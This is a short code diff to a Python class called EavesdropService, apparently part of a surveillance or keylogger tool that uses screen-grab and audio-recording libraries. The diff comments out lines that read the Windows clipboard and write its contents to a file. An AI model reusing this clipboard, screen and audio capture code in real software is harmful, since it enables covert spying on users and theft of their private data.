@@ -4,7 +4,7 @@ from settings import file_path, filenames
 from PIL import ImageGrab
 from scipy.io.wavfile import write
 import sounddevice as sd
-import win32clipboard
+# import win32clipboard
 
 
 class EavesdropService:
@@ -28,11 +28,11 @@ class EavesdropService:
             try:
                 if sys.platform == "win32":
                     import win32clipboard as clip
-                    win32clipboard.OpenClipboard()
-                    pasted_data = win32clipboard.GetClipboardData()
-                    win32clipboard.CloseClipboard()
-                    print(pasted_data)
-                    f.write(pasted_data)
+                    # win32clipboard.OpenClipboard()
+                    # pasted_data = win32clipboard.GetClipboardData()
+                    # win32clipboard.CloseClipboard()
+                    # print(pasted_data)
+                    # f.write(pasted_data)
             except Exception as e:
                 f.write("Clipboard could be not be copied")
                 print(e)
